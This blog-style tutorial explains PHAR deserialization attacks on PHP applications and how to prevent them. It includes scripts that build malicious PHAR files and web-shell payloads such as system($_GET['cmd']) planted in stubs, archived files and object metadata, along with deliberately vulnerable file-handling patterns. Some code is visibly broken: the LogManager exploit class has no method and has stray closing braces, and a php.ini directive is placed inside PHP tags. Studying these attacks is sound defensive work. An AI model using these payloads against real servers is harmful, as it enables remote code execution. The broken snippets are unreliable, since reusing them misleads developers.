---
title: PHAR Deserialization
layout: post
date: 2025-09-29
description: "PHAR (PHP Archive) deserialization is a powerful attack vector that occurs when PHP automatically deserializes metadata from PHAR files during certain file operations, even without explicit unserialize() calls."
permalink: /theory/misc/phar-deserialization
---

## Overview
PHAR (PHP Archive) deserialization is a sophisticated attack vector that exploits PHP's automatic deserialization of metadata stored in PHAR files. Unlike traditional deserialization attacks that require explicit `unserialize()` calls, PHAR deserialization occurs automatically when certain file operations are performed on PHAR files, making it particularly dangerous and often overlooked.

## What is PHAR?

PHAR (PHP Archive) is a packaging format for PHP applications, similar to JAR files for Java. It allows developers to package multiple PHP files into a single archive file with a `.phar` extension.

### PHAR File Structure

A PHAR file consists of four main components:

1. **Stub**: PHP code that executes when the PHAR is included
2. **Manifest**: Metadata about files in the archive, including serialized objects
3. **File Contents**: The actual files stored in the PHAR
4. **Signature**: Cryptographic signature for integrity verification

```
┌─────────────┐
│    Stub     │ ← PHP code executed when PHAR is loaded
├─────────────┤
│  Manifest   │ ← Contains serialized metadata
├─────────────┤
│ File Contents│ ← Actual files in the archive
├─────────────┤
│  Signature  │ ← Cryptographic signature
└─────────────┘
```

## How PHAR Deserialization Works

### Automatic Deserialization Trigger

PHAR deserialization occurs automatically when PHP performs certain file operations on PHAR files. The key insight is that PHP automatically deserializes the metadata stored in the PHAR manifest during these operations.

#### Triggering Functions

The following PHP functions trigger PHAR metadata deserialization when used with `phar://` URLs:

- `file_exists()`
- `is_file()`
- `is_dir()`
- `file_get_contents()`
- `file_put_contents()`
- `fopen()`
- `copy()`
- `unlink()`
- `stat()`
- `readfile()`
- `include()`
- `require()`

#### Example Vulnerable Code

```php
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    
    if (strpos($file, 'phar://') === 0) {
        if (file_exists($file)) {  // ← Triggers deserialization
            readfile($file);
        }
    }
}
?>
```

In this example, when `$file` is set to `phar://path/to/exploit.phar`, the `file_exists()` function automatically deserializes any metadata stored in the PHAR file.

### The Deserialization Process

1. **PHAR Detection**: PHP detects that the path starts with `phar://`
2. **Manifest Reading**: PHP reads the PHAR manifest from the file
3. **Metadata Deserialization**: PHP automatically deserializes the metadata
4. **Object Reconstruction**: PHP reconstructs any serialized objects
5. **Magic Method Execution**: PHP calls magic methods like `__destruct()` or `__wakeup()`

## Creating PHAR Exploits

### Basic PHAR Creation

```php
// Create PHAR file
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('file.txt', 'dummy content');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// Set malicious object as metadata
$malicious = new MaliciousClass();
$phar->setMetadata($malicious);
$phar->stopBuffering();
?>
```

### Advanced PHAR Exploitation

#### Using Existing Classes

Often, we can exploit existing classes in the application that have dangerous magic methods:

```php
<?php
// Target application's LogManager class
namespace app\classes {
    class LogManager {
        public $path = '/var/www/uploads/';
        public $file = 'shell.php';
        public $content = '<?php system($_REQUEST[0]); ?>';
        
        }
    }
}

// Create PHAR with malicious LogManager
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('file.txt', 'dummy');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$evil = new app\classes\LogManager();
$phar->setMetadata($evil);
$phar->stopBuffering();
?>
```

## Magic Methods in PHAR Deserialization

### Key Magic Methods

1. **`__destruct()`**: Called when object is destroyed
2. **`__wakeup()`**: Called when object is unserialized
3. **`__toString()`**: Called when object is used as string
4. **`__call()`**: Called when inaccessible method is invoked
5. **`__get()`**: Called when inaccessible property is accessed
6. **`__set()`**: Called when inaccessible property is set

### Destructor-Based Exploitation

The most common exploitation method uses `__destruct()`:

```php
<?php
class FileWriter {
    public $path;
    public $content;
    
    public function __destruct() {
        file_put_contents($this->path, $this->content);
    }
}

// When this object is deserialized and destroyed,
// it will write $content to $path
?>
```

### Wakeup-Based Exploitation

```php
<?php
class CommandExecutor {
    public $command;
    
    public function __wakeup() {
        system($this->command);
    }
}

// When this object is deserialized,
// __wakeup() is called immediately
?>
```

## Detection and Prevention

### Detection Methods

1. **Code Review**: Look for file operations on user-controlled paths
2. **Static Analysis**: Scan for functions that trigger PHAR deserialization
3. **Dynamic Testing**: Test with PHAR files to see if deserialization occurs

### Prevention Strategies

#### 1. Disable PHAR Support

```php
<?php
// Disable PHAR support entirely
if (strpos($file, 'phar://') === 0) {
    die('PHAR files not allowed');
}
?>
```

#### 2. Validate File Types

```php
<?php
// Check file extension and MIME type
$allowed_extensions = ['jpg', 'png', 'gif'];
$extension = pathinfo($file, PATHINFO_EXTENSION);

if (!in_array($extension, $allowed_extensions)) {
    die('Invalid file type');
}
?>
```

#### 3. Use Safe File Operations

```php
<?php
// Use realpath() to resolve paths
$real_path = realpath($file);
$allowed_dir = realpath('/var/www/uploads/');

if (strpos($real_path, $allowed_dir) !== 0) {
    die('Access denied');
}
?>
```

#### 4. Disable Dangerous Functions

```php
<?php
// In php.ini, disable dangerous functions
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
?>
```

## Advanced Techniques

### PHAR with Different Extensions

```php
<?php
// Create PHAR with various extensions
$extensions = ['jpg', 'png', 'gif', 'pdf', 'docx'];
foreach ($extensions as $ext) {
    $phar = new Phar("exploit.$ext");
    // ... set up malicious metadata
}
?>
```

### PHAR with Custom Stubs

```php
<?php
// Custom stub that executes immediately
$phar->setStub('<?php
    // Malicious code here
    system($_GET["cmd"]);
    __HALT_COMPILER();
?>');
?>
```

### PHAR with Multiple Files

```php
<?php
// Add multiple files to PHAR
$phar->addFromString('shell.php', '<?php system($_GET["cmd"]); ?>');
$phar->addFromString('config.php', '<?php phpinfo(); ?>');
?>
```

## Tools and Resources

### Creation Tools

1. **Manual Creation**: Write PHP scripts to create PHAR files
2. **Online Generators**: Web-based PHAR creation tools
3. **Automated Tools**: Scripts that generate PHAR exploits

### Testing Tools

1. **PHAR Validators**: Tools to validate PHAR file structure
2. **Deserialization Scanners**: Tools that detect PHAR deserialization vulnerabilities
3. **Static Analysis**: Code analysis tools that identify vulnerable patterns

## Common Vulnerabilities

### 1. File Upload Handlers

```php
<?php
// Vulnerable pattern
if (file_exists($uploaded_file)) {
    // Process file
}
?>
```

### 2. File Download Handlers

```php
<?php
// Vulnerable pattern
if (is_file($requested_file)) {
    readfile($requested_file);
}
?>
```

### 3. File Inclusion

```php
<?php
// Vulnerable pattern
include($_GET['file']);
?>
```

### 4. File Operations

```php
<?php
// Vulnerable pattern
if (file_exists($user_file)) {
    $content = file_get_contents($user_file);
}
?>
```

## Best Practices

### For Developers

1. **Never trust user input** for file paths
2. **Validate file types** and extensions
3. **Use whitelist approaches** for allowed files
4. **Implement proper access controls**
5. **Disable PHAR support** if not needed
6. **Use safe file operations** with proper validation

### For Security Testers

1. **Test all file upload/download functionality**
2. **Look for PHAR support** in file operations
3. **Create PHAR files** with malicious metadata
4. **Test different file extensions** and MIME types
5. **Check for magic method exploitation**
6. **Verify deserialization occurs** during file operations

## Conclusion

PHAR deserialization is a powerful and often overlooked attack vector that can lead to remote code execution. Understanding how PHAR files work, how deserialization is triggered, and how to prevent these attacks is crucial for both developers and security professionals. The key is to always validate user input and implement proper security controls around file operations.

## References

### Security Articles and Research
- [PHAR Deserialization Attacks Explained](https://blog.seclify.com/phar-deserialization-attacks-explained/) - Comprehensive explanation of PHAR deserialization attacks
- [Diving into unserialize(): Phar Deserialization](https://vickieli.medium.com/diving-into-unserialize-phar-deserialization-98b1254380e9) - Detailed analysis of PHAR deserialization vulnerabilities
- [PHAR Deserialization (CVE-2023-28115 Patch Bypass)](https://github.com/KnpLabs/snappy/security/advisories/GHSA-92rv-4j2h-8mjj) - Real-world vulnerability example

### Tools and Resources
- [PHP Phar Documentation](https://www.php.net/manual/en/book.phar.php) - Complete PHAR API reference
- [PHP Security Best Practices](https://www.php.net/manual/en/security.php) - General PHP security guidelines
- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html) - OWASP security recommendations for PHP
